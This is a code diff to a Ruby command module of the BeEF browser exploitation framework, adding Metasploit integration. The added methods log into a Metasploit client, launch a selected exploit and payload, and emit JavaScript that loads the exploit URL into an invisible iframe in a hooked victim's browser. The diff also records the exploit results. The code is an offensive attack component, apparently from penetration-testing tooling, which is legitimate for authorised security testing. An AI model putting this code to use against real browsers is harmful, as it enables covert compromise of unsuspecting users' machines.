@@ -18,9 +18,8 @@ class Msf < BeEF::Command
       'Data' => [ ], 
       'File' => __FILE__,
     })
-    
+
     use 'beef.dom'
-    use_template!
   end
   
   def callback
@@ -64,6 +63,7 @@ class Msf < BeEF::Command
 				@info['Description'] = msfinfo['description']
 				@info['MsfModName'] = mod.name
 				@info['mod-id'] = mod.id
+				@info['msfid'] = mod.name
 				@target = targets
 
 	end
@@ -98,7 +98,7 @@ class Msf < BeEF::Command
 						pl << [p]
 			  }	
 				
-				@info['Data'] << { 'name' => 'Payload', 
+				@info['Data'] << { 'name' => 'PAYLOAD', 
 				  'type' => 'combobox', 
 					'ui_label' => 'Payload',
 					'store_type' => 'arraystore', 
@@ -111,7 +111,7 @@ class Msf < BeEF::Command
 					'reloadOnChange' => true, # this will trigger a reload of the payload options
 					'emptyText' => "select a payload..."}
 
-					@info['Data'] << { 'name' => 'mod-id' , 'id' => 'mod-id', 'type' => 'hidden', 'value' => @info['mod-id'] }
+					@info['Data'] << { 'name' => 'mod_id' , 'id' => 'mod_id', 'type' => 'hidden', 'value' => @info['mod-id'] }
 				
 	end
 
@@ -151,6 +151,44 @@ class Msf < BeEF::Command
     JSON.parse(info.to_json)
     
   end
+  def launch_exploit(opts)
+
+		msf = BeEF::MsfClient.new
+		msf.login()
+		ret = msf.launch_exploit(@info['msfid'],opts)
+		@output = "<script>alert('#{ret['uri']}')</script>\n" if ret['result'] == 'success'
+		ret
+	end
+
+
+	def output
+			if @datastore
+				@datastore['command_url'] = BeEF::HttpHookServer.instance.get_command_url(@default_command_url)
+				@datastore['command_id'] = @command_id
+			end
+
+
+			return "
+			
+beef.execute(function() {
+        var result; 
+
+        try { 
+                var sploit = beef.dom.createInvisibleIframe();
+                sploit.src = '#{datastore['sploit_url']}';
+        } catch(e) { 
+                for(var n in e) 
+                        result+= n + ' '  + e[n] ; 
+        } 
+
+});"
+	end
+	  def callback
+			content = {}
+			content['Exploit Results'] = @datastore['result']
+			save content
+		end
+
 
 end
 
